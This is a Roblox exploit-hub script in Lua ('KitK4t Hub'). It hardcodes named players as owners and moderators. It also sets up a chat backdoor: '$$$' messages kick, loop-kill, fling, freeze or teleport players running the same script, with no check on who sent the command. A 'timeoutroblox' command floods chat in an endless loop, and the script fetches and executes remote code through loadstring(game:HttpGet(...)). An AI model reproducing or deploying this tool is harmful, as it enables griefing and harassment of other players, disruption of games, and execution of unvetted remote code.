-- ================== SERVIÇOS ==================
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- ================== NICKS AUTORIZADOS ==================
local Donos = {"Breno010L","itz_kadu22","Gabriel263633j","shawnlovebazuka"}
local Moderadores = {"saitama9rsm","RUANRODRIGO121121"}

local function GetCargo(nome)
    if table.find(Donos,nome) then return "Dono" end
    if table.find(Moderadores,nome) then return "Moderador" end
    return nil
end

-- ================== TAGS ACIMA DA CABEÇA ==================
local function CreateTag(player)
    local cargo = GetCargo(player.Name)
    if not cargo then return end

    if not player.Character or not player.Character.Parent then
        player.CharacterAdded:Wait()
    end
    local char = player.Character

    local head = char:WaitForChild("Head",5) or char:WaitForChild("HumanoidRootPart",5)
    if not head then return end

    if head:FindFirstChild("KitK4tTag") then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "KitK4tTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0,200,0,50)
    billboard.StudsOffset = Vector3.new(0,3,0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1,0,1,0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextScaled = true
    textLabel.TextWrapped = true
    textLabel.Text = cargo.." do KitK4t Hub"
    textLabel.TextColor3 = cargo=="Dono" and Color3.fromRGB(255,0,0) or Color3.fromRGB(0,170,255)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.new(0,0,0)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.Parent = billboard
end

local function UpdateAllTags()
    for _, plr in ipairs(Players:GetPlayers()) do
        plr.CharacterAdded:Connect(function()
            task.wait(0.1)
            CreateTag(plr)
        end)
        if plr.Character then
            task.wait(0.1)
            CreateTag(plr)
        end
    end
end

Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        task.wait(0.1)
        CreateTag(plr)
    end)
    task.wait(0.1)
    CreateTag(plr)
end)

UpdateAllTags()

-- ================== FUNÇÕES DE COMANDO ==================
local function SendCommandMessage(command, target)
    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        local msg = "$$$" .. command
        if target then msg = msg .. " " .. target end
        channel:SendAsync(msg)
    else
        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
            .SayMessageRequest:FireServer("$$$" .. command .. (target and (" " .. target) or ""), "All")
    end
end

local function GetCharacter(playerName)
    local plr = Players:FindFirstChild(playerName)
    return plr and plr.Character or nil
end

local function Kick(playerName)
    if playerName == LocalPlayer.Name then
        LocalPlayer:Kick("Você foi removido pelo KitK4t Hub.")
    end
end

local loopKill = false
local function LoopKill(playerName)
    if playerName == LocalPlayer.Name then
        loopKill = not loopKill
        if loopKill then
            task.spawn(function()
                while loopKill do
                    if LocalPlayer.Character then
                        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                        if hum then hum.Health = 0 end
                    end
                    task.wait(0.3)
                end
            end)
        end
    end
end

local function KillPlus(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            char:BreakJoints()
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10, 10, 10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = workspace

                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 80), math.random(-50, 50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part
                    game.Debris:AddItem(part, 3)
                end
            end
        end
    end
end

local function Fling(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                local tween = TweenService:Create(root, tweenInfo, {CFrame = CFrame.new(50000, 5000000, 3972823)})
                tween:Play()
            end
        end
    end
end

local function Freeze(playerName)
    if playerName == LocalPlayer.Name then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Anchored = true
        end
    end
end

local function UnFreeze(playerName)
    if playerName == LocalPlayer.Name then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Anchored = false
        end
    end
end

local function Bring(playerName)
    local target = Players:FindFirstChild(playerName)
    local localChar = LocalPlayer.Character
    if not target or not target.Character or not localChar then return end

    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = localChar:FindFirstChild("HumanoidRootPart")
    if not targetRoot or not localRoot then return end

    for _, part in ipairs(target.Character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end

    targetRoot.CFrame = localRoot.CFrame + Vector3.new(0,3,0)

    task.delay(0.1, function()
        for _, part in ipairs(target.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end)
end

local function Verifique()
    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync("KitK4t_" .. math.random(1000, 9999))
    end
end

local function TimeoutRoblox()
    task.spawn(function()
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        while true do
            if channel then channel:SendAsync("##########") end
            task.wait(0)
        end
    end)
end

local function HandleChatCommand(text)
    if not text or type(text) ~= "string" then return end
    if string.sub(text,1,3)=="$$$" then
        local args = string.split(text," ")
        local command = string.lower(string.sub(args[1],4))
        local target = args[2]

        if command=="kick" then Kick(target) end
        if command=="loopkill" then LoopKill(target) end
        if command=="killplus" then KillPlus(target) end
        if command=="fling" then Fling(target) end
        if command=="freeze" then Freeze(target) end
        if command=="unfreeze" then UnFreeze(target) end
        if command=="bring" then Bring(target) end
        if command=="verifique" then Verifique() end
        if command=="timeoutroblox" then TimeoutRoblox() end
    end
end

pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if message and message.Text then
            HandleChatCommand(message.Text)
        end
    end)
end)

for _, plr in ipairs(Players:GetPlayers()) do
    plr.Chatted:Connect(HandleChatCommand)
end
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(HandleChatCommand)
end)

-- ================== ORION UI ==================
repeat task.wait() until LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")

local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
local cargoLocal = GetCargo(LocalPlayer.Name) or "Player"
local Window = OrionLib:MakeWindow({Name="KitK4t Hub - "..cargoLocal, IntroText="Painel de "..cargoLocal, HidePremium=true})
local MainTab = Window:MakeTab({Name="Principal", Icon="rbxassetid://4483362458", PremiumOnly=false})

local function GetPlayersList()
    local list = {}
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(list,plr.Name)
        end
    end
    return list
end

local SelectedPlayer = GetPlayersList()[1]
local PlayerDropdown = MainTab:AddDropdown({Name="Selecionar Jogador", Options=GetPlayersList(), Default=SelectedPlayer, Callback=function(val) SelectedPlayer=val end})
Players.PlayerAdded:Connect(function() PlayerDropdown:Refresh(GetPlayersList()) end)
Players.PlayerRemoving:Connect(function() PlayerDropdown:Refresh(GetPlayersList()) end)

local function safeFire(action)
    if action=="verifique" or action=="timeoutroblox" then
        SendCommandMessage(action)
    else
        if SelectedPlayer then
            SendCommandMessage(action, SelectedPlayer)
        end
    end
    OrionLib:MakeNotification({Name="Comando Enviado", Content=(action.." -> "..(SelectedPlayer or "Todos")), Time=2})
end

local commands = {
    {Name=";kick", Cmd="kick"},
    {Name=";loopkill", Cmd="loopkill"},
    {Name=";killplus", Cmd="killplus"},
    {Name=";fling", Cmd="fling"},
    {Name=";freeze", Cmd="freeze"},
    {Name=";unfreeze", Cmd="unfreeze"},
    {Name=";bring", Cmd="bring"},
    {Name=";verifique", Cmd="verifique"},
    {Name=";timeoutroblox", Cmd="timeoutroblox"}
}

for _, cmd in ipairs(commands) do
    MainTab:AddButton({Name=cmd.Name, Callback=function() safeFire(cmd.Cmd) end})
end

MainTab:AddButton({Name="Atualizar Lista", Callback=function() PlayerDropdown:Refresh(GetPlayersList()) end})
